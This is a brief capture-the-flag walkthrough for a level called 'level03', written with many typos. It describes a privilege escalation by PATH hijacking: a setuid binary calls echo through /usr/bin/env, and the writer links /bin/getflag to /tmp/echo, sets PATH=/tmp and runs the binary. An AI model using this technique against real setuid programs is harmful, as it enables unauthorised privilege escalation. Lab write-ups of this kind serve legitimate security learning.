1. there is binary level03 in this level, run the binary, it prints " Exploit me"
2. strings level03 | grep Exploit have the following result:
	/usr/bin/env echo Exploit me
3. with strings level03 we can see this program is change the uid in run time(probabely more rights)
3. the program use echo from Path of the env, then try to creat a fake echo, change the path, since our aim is to run getfalg to get the flag, then we try to make a symblick link with the fake echo
4. which getfalg we have /bin/getflag
5. ln -s /bin/getflag /tmp/echo
6. export PATH=/tmp
7. ./level03 we got the flag
